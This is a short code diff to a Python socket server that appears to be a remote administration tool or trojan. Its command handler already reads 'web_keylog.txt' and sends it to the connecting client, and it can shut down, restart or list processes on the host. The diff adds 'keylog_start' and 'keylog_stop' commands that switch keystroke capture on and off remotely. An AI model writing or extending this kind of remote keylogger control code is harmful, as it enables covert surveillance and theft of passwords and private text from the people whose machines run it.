@@ -221,6 +221,7 @@ def get_process_list():
     except Exception as e: return f"[ERROR] {e}"
 
 def handle_client(conn, addr):
+    global is_keylogging
     try:
         data = conn.recv(4096).decode().strip()
         if not data: return
@@ -291,6 +292,14 @@ def handle_client(conn, addr):
                  with open("web_keylog.txt", "r") as f: result=f.read()
              except: result=""
              conn.sendall(result.encode()); return
+        elif command == "keylog_start":
+            is_keylogging = True
+            conn.sendall(b"[OK] Keylogger Started")
+            return
+        elif command == "keylog_stop":
+            is_keylogging = False
+            conn.sendall(b"[OK] Keylogger Stopped")
+            return
         elif command == "shutdown": result = shutdown_machine()
         elif command == "restart": result = restart_machine()
         elif command == "list_processes": result = get_process_list()
